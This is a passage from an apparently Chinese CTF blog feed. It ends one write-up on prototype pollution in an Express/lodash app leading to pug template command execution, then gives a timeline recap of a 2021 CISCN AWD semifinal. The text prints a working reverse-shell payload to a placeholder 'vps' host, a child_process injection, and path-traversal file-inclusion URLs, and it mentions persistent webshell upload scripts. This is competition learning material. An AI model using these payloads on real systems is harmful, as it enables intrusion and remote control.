punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">min</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>middlewares<span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token string">"hellowrold"</span>    <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>    <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">server listening on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>lod <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span>lod<span class="token punctuation">.</span><span class="token function">setWith</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"__proto__[isadmin]"</span><span class="token punctuation">,</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span></code></pre><p>根据原payload，可以发现，这里用json格式post的请求成功达到了目的，并且还能进行覆盖</p><img src="/article/2021dfjk/image-20210803151756631.png" class="" title="image-20210803151756631" loading="lazy"><p>但是问题在于题目是不解析json请求的，因此不能使用这种方式构造原型链污染</p><img src="/article/2021dfjk/image-20210803152057397.png" class="" title="image-20210803152057397" loading="lazy"><p>反思：比赛中由于未仔细审查代码，导致以为必须要覆盖为admin才行，错失了大量时间，其实只要是非notadmin就行</p><p>最终测试如下</p><img src="/article/2021dfjk/image-20210803151332184.png" class="" title="image-20210803151332184" loading="lazy"><p>Payload:<code>&quot;.constructor.prototype[&quot;xxx</code> </p><p>利用这样的构造器去达到覆盖<code>xxx</code>的目的，<code>.__proto__.</code> 这样是不行的</p><img src="/article/2021dfjk/image-20210803152912326.png" class="" title="image-20210803152912326" loading="lazy"><p>原型链污染成功</p><img src="/article/2021dfjk/image-20210803152818280.png" class="" title="image-20210803152818280" loading="lazy"><h3 id="第四步-命令执行"><a href="#第四步-命令执行" class="headerlink" title="第四步 - 命令执行"></a>第四步 - 命令执行</h3><p>继续看代码，发现<code>session.debug</code>后将<code>query</code>请求的<code>p</code>赋到了<code>info.pretty</code>里。</p><img src="/article/2021dfjk/image-20210803153247822.png" class="" title="image-20210803153247822" loading="lazy"><hr><p>要达到p，首先要覆盖<code>session.debug</code>，所以上一步最终payload为</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span><span class="token number">112222</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">123456</span><span class="token operator">&amp;</span>a<span class="token string double-quoted-string">".constructor.prototype["</span>isadmin<span class="token operator">=</span><span class="token operator">&amp;</span>a<span class="token string double-quoted-string">".constructor.prototype["</span>debug<span class="token operator">=</span></code></pre><hr><p>利用文件读取读到了<code>/app/view/admin.pug</code></p><pre class="language-pug" data-language="pug"><code class="language-pug"><span class="token tag">html</span>  <span class="token tag">head</span>    <span class="token tag">title</span><span class="token punctuation">=</span><span class="token code"> title</span>    <span class="token tag">meta<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">http-equiv</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"Content-Type"</span></span><span class="token punctuation">,</span> <span class="token attr-name">content</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text/html;charset=UTF-8"</span></span><span class="token punctuation">)</span></span></span>  <span class="token tag">body</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">hello</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span></span>      <span class="token tag">p</span><span class="token punctuation">=</span><span class="token code"> text</span>      <span class="token tag">div</span> <span class="token plain-text">#&#123;msg&#125;</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>      <span class="token tag">div</span> <span class="token plain-text">个性签名：</span>        <span class="token tag">div</span> <span class="token plain-text">#&#123;diy&#125;</span>        <span class="token tag">div</span> <span class="token plain-text">---#&#123;msg&#125;</span>    <span class="token tag">form<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">action</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">""</span></span><span class="token punctuation">,</span> <span class="token attr-name">method</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"get"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">div</span> <span class="token plain-text">更改图片</span>        <span class="token tag">select<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">name</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"newimg"</span></span><span class="token punctuation">)</span></span></span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/1.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">纸飞机</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/2.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">人</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/3.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">小火车</span>      <span class="token tag">div</span> <span class="token plain-text">个性签名</span>        <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"diy"</span> value<span class="token operator">=</span><span class="token string">"尊贵的admin可以在这更改个性签名"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"submit"</span></span><span class="token punctuation">)</span></span></span>    <span class="token tag">div</span> <span class="token plain-text">&lt;img src='#&#123;png&#125;'></span>    <span class="token mixin"><span class="token name function">+hello</span><span class="token punctuation">(</span><span class="token string">"哈喽"</span><span class="token punctuation">)</span></span>    <span class="token mixin"><span class="token name function">+printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></code></pre><p>而pug这里存在命令执行漏洞，原因在pug模版引擎的一个<a href="https://github.com/pugjs/pug/issues/3312">issue</a>中提到的</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">?</span>p<span class="token operator">=</span><span class="token string single-quoted-string">');process.mainModule.constructor._load('</span>child_process<span class="token string single-quoted-string">').exec('</span>whoami<span class="token string single-quoted-string">');_=('</span></code></pre><p>反思：exec是不回显的！一直让我以为是我打的方式不对…</p><p>既然没回显那试一下发现是通外网的，就弹个shell回来。这算是个注入，一打整个界面变得惨不忍睹</p><img src="/article/2021dfjk/image-20210803153836972.png" class="" title="image-20210803153836972" loading="lazy"><p>普通的弹shell命令似乎并不管用，直接干它 用python命令弹shell</p><img src="/article/2021dfjk/image-20210803153955025.png" class="" title="image-20210803153955025" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">.&#x2F;?p&#x3D;&#39;);process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#39;vps\&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&#39;&#x2F;bin&#x2F;bash\&#39;,\&#39;-i\&#39;]);&quot;&#39;);_&#x3D;(&#39;</code></pre><p>成功弹到shell，获得flag</p><img src="/article/2021dfjk/image-20210803154137511.png" class="" title="image-20210803154137511" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>巅峰fw就是我了，做题经验还是不足，对于原型链污染这一块的知识经过这一次比赛的检测发现还是有所欠缺，抓紧总结巩固一下js原型链污染的知识点吧。</p><hr><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/1426/">Seebug express-validator 6.6.0 原型链污染分析</a></p><p><a href="https://github.com/pugjs/pug/issues/3312">pug模版引擎issue</a></p><p><a href="https://www.mrkaixin.top/">@Mrkaixin师傅</a> 非常感谢Mrkaixin师傅的指导</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021ciscn华东北半决赛</title>
      <link href="article/2021ciscnawd/"/>
      <url>article/2021ciscnawd/</url>
      
        <content type="html"><![CDATA[<p>第一次打正式的国赛半决赛awd，复盘总结，分析与反思</p><span id="more"></span><h2 id="队伍名称：S3C-2021"><a href="#队伍名称：S3C-2021" class="headerlink" title="队伍名称：S3C_2021"></a>队伍名称：S3C_2021</h2><p>第31名</p><p>止步于此，虽不荣耀，但仅以此鞭策自己。为自己，为团队，为后继的学弟学妹们记录。</p><p>至暗时刻，虽不愿承认，本工作室打出了历史辉煌后最差的一次成绩</p><p>本人很自责，没能跟随师傅们的步伐前进，拖队伍后腿止步于半决赛</p><p>在此复盘总结</p><hr><h2 id="比赛时间：2021年6月19日-9-00-18-30"><a href="#比赛时间：2021年6月19日-9-00-18-30" class="headerlink" title="比赛时间：2021年6月19日 9:00-18:30"></a>比赛时间：2021年6月19日 9:00-18:30</h2><p>按照<code>时间：- 事件</code>格式进行完整复盘，以本人角度对赛况进行分析</p><h3 id="时间：比赛前-赛前准备"><a href="#时间：比赛前-赛前准备" class="headerlink" title="时间：比赛前 - 赛前准备"></a>时间：比赛前 - 赛前准备</h3><p>准备好了完备的awd不死码批量上传激活脚本，提交flag脚本，以及各类log日志及分析工具，按照去年情况，题目是web多pwn少，对于web做好了充分的准备，awd前期速度取胜，如果有简单后门就可以直接利用，达到全程拿分的目的。</p><p>本队三位web师傅一位pwn师傅</p><h3 id="时间：比赛时-赛况"><a href="#时间：比赛时-赛况" class="headerlink" title="时间：比赛时 - 赛况"></a>时间：比赛时 - 赛况</h3><h4 id="8-30左右-未开赛"><a href="#8-30左右-未开赛" class="headerlink" title="8:30左右 - 未开赛"></a>8:30左右 - 未开赛</h4><p>准备好设备，我带了两台电脑，一台电脑插上网线，开wifi，另一台电脑连接。由于m1的arm架构问题，有些事情不得不在windows上做，比如D盾扫描之类的，为防止纠纷我两台电脑都进行了录屏。</p><h4 id="9-00-第1轮"><a href="#9-00-第1轮" class="headerlink" title="9:00 - 第1轮"></a>9:00 - 第1轮</h4><p>开始比赛，靶机全部用ssh私钥连接，不存在篡改密码的情况。</p><p>第一批2道web两道pwn。以ip标号命名，<code>11/12</code> 是web，<code>13/15</code>是pwn</p><img src="/article/2021ciscnawd/image-20210620165959278.png" class="" title="image-20210620165959278" loading="lazy"><p>从左到右依次是11-17</p><p>上来我们三位web师傅首先下载ssh</p><pre class="language-none"><code class="language-none">safecms --&gt; 172.35.xx.11:80,eyou --&gt; 172.35.xx.12:80,decoder --&gt; 172.35.xx.13:9999,cryptopark --&gt; 172.35.xx.14:9999,eval --&gt; 172.35.xx.15:9999,secgame --&gt; 172.35.xx.16:9999,lol --&gt; 172.35.xx.17:80</code></pre><img src="/article/2021ciscnawd/image-20210620173025274.png" class="" title="image-20210620173025274" loading="lazy"><p>一看就是3web，4pwn。导入密钥后发现怎么都连不上，过了一段时间，主办方通知 有些靶机没有启动成功，正在启动，有问题举手示意。离谱的是，大家都没连上，某学校第一轮已经发现漏洞并写好脚本打了全场的分，独占鳌头。</p><p>第一轮由于靶机未启动成功，所以check down了，无语。</p><img src="/article/2021ciscnawd/image-20210620210522286.png" class="" title="image-20210620210522286" loading="lazy"><h4 id="9-10-第2轮-直接进攻"><a href="#9-10-第2轮-直接进攻" class="headerlink" title="9:10 - 第2轮 - 直接进攻"></a>9:10 - 第2轮 - 直接进攻</h4><p>旁边web师傅连接成功，上去后首先挂了log和文件监控，然后拖下来源码开始扫。</p><img src="/article/2021ciscnawd/upload_df544a9bb4d1a8a99073e4f878056ce0.png" class="" title="img" loading="lazy"><p>直接发现文件包含漏洞，如下</p><img src="/article/2021ciscnawd/image-20210620190953385.png" class="" title="image-20210620190953385" loading="lazy"><p>调用show方法，直接可以文件包含<code>/flag</code></p><img src="/article/2021ciscnawd/image-20210620191059855.png" class="" title="image-20210620191059855" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</code></pre><p>开始写脚本全场打，之前预先写好的提交flag脚本针对的是D段的，改成C段浪费了点时间。</p><img src="/article/2021ciscnawd/image-20210620193200148.png" class="" title="image-20210620193200148" loading="lazy"><p>然后直线上分，靠这一步稳步在了第5名。我们将此处调用直接注释，成功防御和check。11被打到了第3轮。</p><p>此时12，13，15还没有人出，我们开始分析源码挖洞。</p><img src="/article/2021ciscnawd/image-20210622155449870.png" class="" title="image-20210622155449870" loading="lazy"><p>上通防的给逮到了吧</p><h4 id="9-30左右-第4-5轮"><a href="#9-30左右-第4-5轮" class="headerlink" title="9:30左右 - 第4-5轮"></a>9:30左右 - 第4-5轮</h4><p>发现我们的服务直接就checkdown了，经确认，发现是waf和套壳的原因，我们下掉了waf和壳</p><img src="/article/2021ciscnawd/image-20210620211053690.png" class="" title="image-20210620211053690" loading="lazy"><p>12被扣20分，15被扣10分</p><h4 id="9-50左右-第6-9轮"><a href="#9-50左右-第6-9轮" class="headerlink" title="9:50左右 - 第6-9轮"></a>9:50左右 - 第6-9轮</h4><img src="/article/2021ciscnawd/image-20210620212448430.png" class="" title="down" loading="lazy"><p>发现12大量宕机，警惕</p><p>第9轮，进到了第三名</p><img src="/article/2021ciscnawd/image-20210620212907416.png" class="" title="image-20210620212907416" loading="lazy"><h4 id="10-30左右-第10轮-pwn题一血"><a href="#10-30左右-第10轮-pwn题一血" class="headerlink" title="10:30左右 - 第10轮 - pwn题一血"></a>10:30左右 - 第10轮 - pwn题一血</h4><img src="/article/2021ciscnawd/image-20210620213129362.png" class="" title="image-20210620213129362" loading="lazy"><p>pwn全场被攻击，开始分析流量</p><img src="/article/2021ciscnawd/image-20210620213518653.png" class="" title="image-20210620213518653" loading="lazy"><p>pwn爷在努力复现</p><p>第11轮，<code>TimeKeeper</code>直接凭借一题上了近700分，打到了第二，我们到了第四</p><img src="/article/2021ciscnawd/image-20210622133401466.png" class="" title="image-20210622133401466" loading="lazy"><p>pwn爷本地套壳尝试，发现本地可以，靶机不行。此时商量对策，由于我们排名较为靠前，为减少差距，我们决定宕机。这样宕机扣10分给全场，被打扣10分给打的人，不如给全场，于是决定自行宕机。</p><img src="/article/2021ciscnawd/image-20210622133745484.png" class="" title="image-20210622133745484" loading="lazy"><p>pwn爷重放失败，觉得是方式问题，我们让他稳住，慢慢检查。</p><h4 id="11-20左右-第15轮"><a href="#11-20左右-第15轮" class="headerlink" title="11:20左右 - 第15轮"></a>11:20左右 - 第15轮</h4><p>13被攻击</p><img src="/article/2021ciscnawd/image-20210622133904810.png" class="" title="image-20210622133904810" loading="lazy"><p>由于部分队伍重放成功，我们掉到了第7。我们鼓励pwn师傅优先重放，暂时不用修。</p><p>同时我帮忙检查了流量</p><img src="/article/2021ciscnawd/image-20210622134327938.png" class="" title="image-20210622134327938" loading="lazy"><p>怀疑是混淆流量，最后证实不需要这么复杂。当时让pwn师傅先保存，优先看15.</p><h4 id="11-40-第17轮-被人关站"><a href="#11-40-第17轮-被人关站" class="headerlink" title="11:40 - 第17轮 - 被人关站"></a>11:40 - 第17轮 - 被人关站</h4><p>（主办方送饭来了）</p><p>突发状况，web2大量宕机。发现网站被人关闭了。经主办方提醒，web2有后台管理，密码默认，被人批量改了密码登陆后台关闭了网站。网站显示<code>网站暂时关闭，维护中……</code></p><p>黑，真tm的黑啊。</p><p>还好网站有备份，尝试复原，发现无法复原，没有权限。</p><p>但是数据库还在，尝试修改数据库里的admin密码，发现是md5，生成后发现不对，密码应该是加盐了</p><p><strong>各方尝试后，在11:45左右，我们向主办方申请了重置靶机12。</strong></p><p>重置完成后立刻登陆，可是人家写好了批量攻击脚本，我们没人家快</p><img src="/article/2021ciscnawd/image-20210622135940583.png" class="" title="image-20210622135940583" loading="lazy"><p>这时候突发奇想，搜索源码</p><img src="/article/2021ciscnawd/image-20210622140242016.png" class="" title="image-20210622140242016" loading="lazy"><p>既然这有判断，那就干脆全部注释，或者把<code>0</code>改成<code>1</code></p><img src="/article/2021ciscnawd/image-20210622140326152.png" class="" title="image-20210622140326152" loading="lazy"><p>网站恢复了，但这次处理耗费了大量时间，我们已经开始乱了阵脚</p><p>此时pwn师傅那决定13也自行宕机。</p><h4 id="12-00-第19轮-修复12"><a href="#12-00-第19轮-修复12" class="headerlink" title="12:00 - 第19轮 - 修复12"></a>12:00 - 第19轮 - 修复12</h4><p>危机还未解除，我们发现12还是checkdown的状态</p><p>同时12点上了新题，刷新发现，上了两道pwn题，pwn师傅直接瘫倒在了椅子上，我们三个web心里凉了一截，已经认定本次比赛我们基本上已经输了。（此时要是上1web1pwn也许还有机会，可是上了2pwn题）</p><p>pwn师傅此时发现不会重放流量，意味着我们pwn题没有输出了，同时尝试修复，发现修复就checkdown，意味着我们现在2web4pwn，4pwn完全就是送分的状态，基本上结局已定。</p><p>11&#x2F;12为web，13&#x2F;15为pwn，14&#x2F;16为新上的pwn</p><img src="/article/2021ciscnawd/image-20210622142809731.png" class="" title="image-20210622142809731" loading="lazy"><p>我们让pwn师傅稳住，不管结果如何我们一起接受，此时大家都心知肚明，可是没人敢点破…</p><p><strong>即使注定失败，我们也得战到最后</strong></p><p>目前web任务：修复好12</p><p>我去审计代码</p><img src="/article/2021ciscnawd/image-20210620174753069.png" class="" title="image-20210620174753069" loading="lazy"><p>找到了Admin后台路由为<code>/Admin/login</code>（其实审流量能看到，可是被人打了混淆太恶心了）</p><img src="/article/2021ciscnawd/image-20210622141935947.png" class="" title="image-20210622141935947" loading="lazy"><p>在<code>application/admin/controller/Admin.php</code>下发现验证方式</p><img src="/article/2021ciscnawd/image-20210622142119360.png" class="" title="image-20210622142119360" loading="lazy"><p>跟进<code>func_encrypt</code>看，发现确实加盐了，现在要找到位置，继续跟进</p><img src="/article/2021ciscnawd/image-20210622142205443.png" class="" title="image-20210622142205443" loading="lazy"><p>发现应该存在数据库中，幸亏数据库未被改密码</p><img src="/article/2021ciscnawd/image-20210622142403373.png" class="" title="image-20210622142403373" loading="lazy"><p>在数据库中找到盐</p><img src="/article/2021ciscnawd/image-20210622142613420.png" class="" title="image-20210622142613420" loading="lazy"><p>update一下admin的密码，成功修改成功，把网站恢复正常了。</p><img src="/article/2021ciscnawd/image-20210622155405384.png" class="" title="image-20210622155405384" loading="lazy"><h4 id="12-20-第21轮"><a href="#12-20-第21轮" class="headerlink" title="12:20 - 第21轮"></a>12:20 - 第21轮</h4><p>我们掉到了17名</p><p>此时新上的14直接被人a掉了，不过是试探性的打了两个队，下一轮就要全场打了</p><img src="/article/2021ciscnawd/image-20210622143135148.png" class="" title="image-20210622143135148" loading="lazy"><img src="/article/2021ciscnawd/image-20210622143251871.png" class="" title="image-20210622143251871" loading="lazy"><h4 id="13-00-第25轮"><a href="#13-00-第25轮" class="headerlink" title="13:00 - 第25轮"></a>13:00 - 第25轮</h4><p>（主办方提示饭凉了，我们还没动过旁边的饭）</p><p>此时掉到了26名</p><p>我审计14的流量，发现流量很简单，没有地址特殊字符等等</p><img src="/article/2021ciscnawd/image-20210622143728983.png" class="" title="image-20210622143728983" loading="lazy"><p>我叫pwn师傅先看这题，此时pwn师傅神情恍惚</p><h4 id="14-00-第31轮"><a href="#14-00-第31轮" class="headerlink" title="14:00 - 第31轮"></a>14:00 - 第31轮</h4><p>此时16被人解出，我们掉到了30名</p><img src="/article/2021ciscnawd/image-20210622144130081.png" class="" title="image-20210622144130081" loading="lazy"><p>pwn师傅尝试修复14，被checkdown并被攻击</p><h4 id="14-20-第33轮-pwn重放成功"><a href="#14-20-第33轮-pwn重放成功" class="headerlink" title="14:20 - 第33轮 - pwn重放成功"></a>14:20 - 第33轮 - pwn重放成功</h4><p>pwn师傅重放14成功！</p><img src="/article/2021ciscnawd/image-20210622144406529.png" class="" title="image-20210622144406529" loading="lazy"><p>开始准备批量打，这时发现批量打脚本有问题，无法结束连接。无奈最后我们全部手交14的flag一直交到比赛结束，中间遗漏了不少</p><h4 id="15-00-第37轮-新题上场"><a href="#15-00-第37轮-新题上场" class="headerlink" title="15:00 - 第37轮 - 新题上场"></a>15:00 - 第37轮 - 新题上场</h4><img src="/article/2021ciscnawd/image-20210622145507276.png" class="" title="image-20210622145507276" loading="lazy"><p>11,12全down了，16pwn师傅还是自行宕机</p><p>此时上了新题，一道简单web，我们决定努力一下</p><p>直接发现文件包含漏洞</p><p><code>./statics/1.php?file=/flag</code></p><p>里面是个file_get_contents，直接删除，我立刻写脚本开始全场打</p><img src="/article/2021ciscnawd/image-20210622151547266.png" class="" title="image-20210622151547266" loading="lazy"><p>题目刚上来一轮就攻击成功，也有其他队发现了漏洞，和我们平分了分数</p><img src="/article/2021ciscnawd/image-20210622151717676.png" class="" title="image-20210622151717676" loading="lazy"><p>这一波的反应极其迅速，可是还是无法弥补前面的差距。但我们不想放弃。</p><p>决定一位web师傅继续审计17，另外的师傅修11&#x2F;12，我继续审计流量。</p><h4 id="15-20-第39轮-再出一洞"><a href="#15-20-第39轮-再出一洞" class="headerlink" title="15:20 - 第39轮 - 再出一洞"></a>15:20 - 第39轮 - 再出一洞</h4><p>审计发现了17第二个洞如下</p><p><code>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=../../../../../../../../../../../../../../flag</code></p><p>与11模版相似，直接写脚本再打</p><img src="/article/2021ciscnawd/image-20210622152502255.png" class="" title="image-20210622152502255" loading="lazy"><p>修复方法直接注释</p><h4 id="15-50-第42轮-针对check"><a href="#15-50-第42轮-针对check" class="headerlink" title="15:50 - 第42轮 - 针对check"></a>15:50 - 第42轮 - 针对check</h4><p>12网站正常却checkdown，发现数据库给人删了，听说是sql注入手注给人删了库，我们仅剩一次重置机会，况且11现在还在宕机找不到原因。</p><p>队里师傅灵机一动开始分析，我们发现check流量是登陆随机用户，用户名密码都是错的，验证码不可能智能到分析验证码吧</p><p>来自10.10.10.10的check流量</p><img src="/article/2021ciscnawd/image-20210622153217583.png" class="" title="image-20210622153217583" loading="lazy"><p>现在登陆会显示数据库错误，那就全局搜索，把<code>数据库错误</code>改成了<code>验证码错误</code></p><img src="/article/2021ciscnawd/image-20210622154205778.png" class="" title="image-20210622154205778" loading="lazy"><h4 id="16-00-第43轮"><a href="#16-00-第43轮" class="headerlink" title="16:00 - 第43轮"></a>16:00 - 第43轮</h4><p>pwn师傅尝试修复14被checkdown并被攻击</p><p>11经确认被人写码了，占用资源疯狂写缓存</p><img src="/article/2021ciscnawd/image-20210622154547731.png" class="" title="image-20210622154547731" loading="lazy"><p>实在是不知道怎么办，如果重置的话又会被打。</p><p>pwn师傅说他累了，手 交 要洗内了</p><h4 id="16-30-第46轮-新的0day"><a href="#16-30-第46轮-新的0day" class="headerlink" title="16:30 - 第46轮 - 新的0day"></a>16:30 - 第46轮 - 新的0day</h4><p>12突然报又被打了，立刻查流量</p> <img src="/article/2021ciscnawd/image-20210622155218748.png" class="" title="image-20210622155218748" loading="lazy"><p>然后一刷新主页发现flag就在主页</p><p>咱们就也写，复现成功</p><img src="/article/2021ciscnawd/image-20210622155711588.png" class="" title="image-20210622155711588" loading="lazy"><p>最后一句话没写进去，不知道为啥</p><p>修复就再编辑下把自己的主页恢复就行。前端rce，收获0day一个</p><p>第47轮惨状留念</p><img src="/article/2021ciscnawd/image-20210622154927603.png" class="" title="image-20210622154927603" loading="lazy"><h4 id="17-00-第49轮"><a href="#17-00-第49轮" class="headerlink" title="17:00 - 第49轮"></a>17:00 - 第49轮</h4><img src="/article/2021ciscnawd/image-20210622160146600.png" class="" title="image-20210622160146600" loading="lazy"><p>pwn师傅说他真的累了，给pwn师傅写了个一键提交，让他稍微轻松一点</p><img src="/article/2021ciscnawd/image-20210622160205845.png" class="" title="image-20210622160205845" loading="lazy"><h4 id="17-30-第52轮-复原pwn题"><a href="#17-30-第52轮-复原pwn题" class="headerlink" title="17:30 - 第52轮 - 复原pwn题"></a>17:30 - 第52轮 - 复原pwn题</h4><p>比赛还剩一个小时，pwn师傅将pwn题全部复原了</p><img src="/article/2021ciscnawd/image-20210622161135972.png" class="" title="image-20210622161135972" loading="lazy"><p>11不准备修了，不准备重置了，躺平了。</p><p>咱开了31个shell帮pwn师傅一起交flag</p><img src="/article/2021ciscnawd/image-20210622162019446.png" class="" title="image-20210622162019446" loading="lazy"><h4 id="18-10-第56轮"><a href="#18-10-第56轮" class="headerlink" title="18:10 - 第56轮"></a>18:10 - 第56轮</h4><img src="/article/2021ciscnawd/image-20210622161728291.png" class="" title="image-20210622161728291" loading="lazy"><p>咱17从3:00刚上到最后没被打一次，而且刚上就一直在打别人，算是小小的欣慰吧。</p><p>在？看看骚扰流量？</p><img src="/article/2021ciscnawd/image-20220606164038111.png" class="" title="image-20220606164038111" loading="lazy"><h4 id="18-30-第57轮-比赛结束"><a href="#18-30-第57轮-比赛结束" class="headerlink" title="18:30 - 第57轮 - 比赛结束"></a>18:30 - 第57轮 - 比赛结束</h4><p>最终记录</p><img src="/article/2021ciscnawd/BDD377D32C18C9C712D72741E9A5A11A.jpg" class="" title="BDD377D32C18C9C712D72741E9A5A11A" loading="lazy"><p>饭都凉了，一天没吃东西</p><hr><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>结束后合照都没有，我们2只队直接离开了赛场。</p><p>这是5位大三师傅们最后一次比赛了可能。</p><p>大二我是web，两位是pwn，一位准备考研去不想打ctf了，另一位很自责</p><p>那位pwn师傅回校后2小时复现了全部的题，自动化提交flag脚本注释掉一行就好了</p><p>他现在非常非常自责</p><hr><h2 id="总结"><a href="#总结" class="headerlink" 